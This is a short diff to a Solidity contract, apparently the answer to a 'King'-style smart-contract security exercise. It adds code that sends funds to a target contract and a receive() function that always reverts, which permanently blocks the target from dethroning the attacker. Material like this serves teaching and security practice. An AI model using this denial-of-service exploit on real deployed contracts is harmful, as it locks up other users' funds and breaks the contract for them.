@@ -11,6 +11,10 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        contractAddress.call{value: address(this).balance}("");
+    }
+
+    receive() external payable {
+        require(false, "I am the captain now!");
     }
 }
